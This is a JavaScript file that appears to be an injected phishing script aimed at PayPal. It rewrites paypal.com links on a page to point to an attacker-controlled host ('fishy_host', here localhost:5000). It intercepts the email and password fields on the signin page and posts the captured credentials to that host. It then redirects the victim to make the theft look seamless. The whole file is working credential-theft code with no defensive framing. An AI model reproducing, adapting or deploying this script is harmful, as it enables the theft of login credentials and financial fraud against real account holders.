alert('parasite')
const modules={
  requests:{
    setHeaders:function(req,headers){
      const header_keys=Object.keys(headers);
      header_keys.forEach((currentValue)=>{
        req.setRequestHeader(currentValue,headers[currentValue])
      })
      return req
    },
    setData:function(url,data){
      console.log('setdata url:',url)
      url+="?"
      const header_keys=Object.keys(data);
      header_keys.forEach((currentValue)=>{
        url+=currentValue + "=" + data[currentValue] + "&"
      })
      return url
    },
    request:function(url,headers,data={},method="GET"){
      let req = new XMLHttpRequest();
      url=this.setData(url,data);
      req.open(method,url,false);
      req=this.setHeaders(req,headers);
      req.send(null);
      return req.responseText;
    },
    get:function(url,headers={},data={}){
      return this.request(url,headers,data)
    },
    post:function(url,headers={},data={}){
      return this.request(url,headers,data,"POST")
    }
  }
}

const route={
    host:"https://www.paypal.com",
    fishy_host:"http://localhost:5000",
    fishy_login:"/myaccount/summary/",
    domain:window.location.href,
    url_regex:/(http[s]*:\/\/[^\/]+)(.*)/,
    query:function(){
      return this.domain.match(this.url_regex)[2];
    }
}

const back_door={
  "/":function(){
      const a_tags=document.querySelectorAll('a');
      a_tags.forEach((currentValue)=>{
        const href=currentValue.getAttribute('href');
        if(href.indexOf(route.host)==-1){return}
        const fishy_href=href.replace(route.host,route.fishy_host)
        currentValue.setAttribute('href',fishy_href);
        console.log('href:',currentValue.getAttribute('href'))
    })
  },
  signin:function(){
    const username_input=document.querySelector('#email');
    const password_input=document.querySelector('#password');
    const signin_button=document.querySelector('#btnLogin');
    function login(){
      const username=username_input.value;
      const password=password_input.value;
      if(username.length < 3 || password.length < 3){return false};
      modules.requests.post(route.fishy_host,{},{
        'username':username,
        'password':password
      })
      window.location.href=route.fishy_host + route.fishy_login;
    }
    signin_button.addEventListener('click',function(e){
      e.preventDefault();
      login();
    })
    password_input.addEventListener('keydown',function(e){
      if(e.keyCode!=13){return false};
      e.preventDefault();
      e.stopPropagation();
      login();
    })
  },
  "/myaccount/summary/":function(){
    window.location.href=route.host;
  },
  "/myaccount/summary":function(){
    window.location.href=route.host;
  }
}

const path_gen=(query)=>{
  if(back_door[query]!=undefined){return query}
  if(query.indexOf("signin?country")!=-1){return "signin"}
  return query
}

const query=route.query();
const path=path_gen(query);
const bd=back_door[path]()
